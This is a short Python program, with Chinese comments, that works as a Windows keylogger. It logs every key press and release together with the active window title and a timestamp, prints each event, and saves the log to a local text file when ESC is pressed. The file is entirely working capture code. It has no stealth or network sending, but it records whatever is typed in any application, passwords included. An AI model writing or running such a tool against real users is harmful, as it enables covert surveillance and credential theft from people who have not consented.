from pynput import keyboard
import win32gui
import time

# 存储按键记录
key_log = []

def get_active_window_title():
    """获取当前活动窗口的标题"""
    return win32gui.GetWindowText(win32gui.GetForegroundWindow())

def on_press(key):
    """按键按下时的回调函数"""
    try:
        current_window = get_active_window_title()
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
        
        log_entry = {
            'time': timestamp,
            'window': current_window,
            'event': 'press',
            'key': key.char if hasattr(key, 'char') else str(key)
        }
        
        key_log.append(log_entry)
        print(f"[{timestamp}] [{current_window}] 按下: {log_entry['key']}")
        
    except Exception as e:
        print(f"发生错误: {e}")

def on_release(key):
    """按键释放时的回调函数"""
    if key == keyboard.Key.esc:
        # 按下ESC键停止监听
        print("\n检测到ESC键，停止监听...")
        return False
    
    try:
        current_window = get_active_window_title()
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
        
        log_entry = {
            'time': timestamp,
            'window': current_window,
            'event': 'release',
            'key': key.char if hasattr(key, 'char') else str(key)
        }
        
        key_log.append(log_entry)
        print(f"[{timestamp}] [{current_window}] 释放: {log_entry['key']}")
        
    except Exception as e:
        print(f"发生错误: {e}")

def save_log_to_file(filename="keylog.txt"):
    """将按键记录保存到文件"""
    with open(filename, "w", encoding="utf-8") as f:
        for entry in key_log:
            f.write(f"{entry['time']} | {entry['window']} | {entry['event']} | {entry['key']}\n")
    print(f"日志已保存到 {filename}")

def main():
    print("开始监听键盘输入... (按ESC键停止)")
    
    # 创建键盘监听器
    with keyboard.Listener(
            on_press=on_press,
            on_release=on_release) as listener:
        listener.join()
    
    # 监听结束后保存日志
    save_log_to_file()

if __name__ == "__main__":
    main()